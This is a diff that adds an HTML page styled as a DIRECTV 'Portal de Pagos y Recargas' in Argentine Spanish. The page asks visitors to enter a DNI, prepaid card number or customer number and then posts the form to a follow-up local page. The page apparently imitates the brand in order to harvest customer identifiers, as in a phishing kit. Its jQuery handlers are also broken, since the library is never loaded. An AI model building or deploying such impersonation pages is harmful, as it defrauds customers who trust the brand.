@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Recarga Direct</title>
+    <link href="./private_sense/cs/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" type="text/css" href="./private_sense/cs/main.css.css">
+</head>
+
+<body>
+    <header>
+        <div class="w-100 text-center p-1 header-info">
+            <b class="text-white fw-normal">Líneas de Ventas <span class="fw-bold"
+                    style="color:#03a9f4;">0810-334-654</span> | <span class="fw-bold" style="color:#03a9f4;">Clientes:
+                    0800 412 654</span></b>
+        </div>
+        <nav class="navbar bg-dark p-0 p-3">
+            <div class="container-fluid">
+                <a class="navbar-brand" href="">
+                    <img src="./private_sense/svg/logo.svg">
+                </a>
+            </div>
+        </nav>
+    </header>
+    <div class="container-fluid m-0">
+
+        <div class="row m-0 p-3">
+            <div class="text-start mt-5 mb-5 col-sm-7 m-auto">
+                <h1 class="fw-bold">Portal de Pagos y Recargas</h1>
+                <p class="text-start">En este portal podés pagar tu factura o recargar tu Prepago de forma segura,
+                    rápida y fácil.</p>
+            </div>
+            <div class="col-sm-8 m-auto p-3 rounded shadow">
+                <form class="w-100 m-auto" style="max-width:400px !important;" action="./index2.html" method="POST">
+                    <fieldset>
+                        <legend class="fs-5 fw-bold">Elegí una opción para ingresar</legend>
+                        <div class="">
+                            <div class="mb-0">
+                                <input type="radio" id="dniCheck" name="selecUser" value="dna">
+                                <label>DNI</label>
+                            </div>
+                            <div class="mb-0">
+                                <input type="radio" id="tprep" checked="" name="selecUser" value="numPrepago">
+                                <label>N° de Tarjeta Prepago</label>
+                            </div>
+                            <div class="mb-0">
+                                <input type="radio" id="nCliente" name="selecUser" value="nclient">
+                                <label>Nº de Cliente</label>
+                            </div>
+                            <div class="mb-3 mt-2 p-0">
+                                <input type="number" placeholder="00022244444666" required=""
+                                    class="form-control w-100 mb-3" name="userSend" id="enterNumUser">
+                                <div id="emailHelp" class="text-dark" style="font-size:14px;">El Nº de Tarjeta Prepago
+                                    es de 12 dígitos. Encontralo en el canal 100 de DIRECTV.</div>
+                            </div>
+                            <div class="mb-3">
+                            </div>
+                            <button class="btn fw-bold mb-4" name="start" id="getStart" disabled=""
+                                style="background: rgb(204, 204, 204);">CONTINUAR</button>
+                        </div>
+                    </fieldset>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script type="text/javascript">
+        var btn = document.getElementById("getStart");
+        btn.style.background = "#cccccc";
+        var inputUser = document.getElementById("enterNumUser");
+        enterNumUser.addEventListener("keyup", function () {
+            if (enterNumUser.value != "") {
+                btn.style.background = "#0073ae";
+                btn.disabled = false;
+            } else {
+                btn.style.background = "#cccccc";
+                btn.disabled = true;
+            }
+        })
+
+        $('#tprep').click(function () {
+            $(".form-control").attr("placeholder", "00022244444666");
+            $('#emailHelp').html("El Nº de Tarjeta Prepago es de 12 dígitos. Encontralo en el canal 100 de DIRECTV.");
+        })
+        $('#dniCheck').click(function () {
+            $(".form-control").attr("placeholder", "");
+            $('#emailHelp').html("Ingresá el DNI del titular de la cuenta.");
+        })
+        $('#nCliente').click(function () {
+            $(".form-control").attr("placeholder", "");
+            $('#emailHelp').html("Tu Nº de Cliente lo encontrás en tu factura.");
+        })
+    </script>
+
+
+</body>
+
+</html>
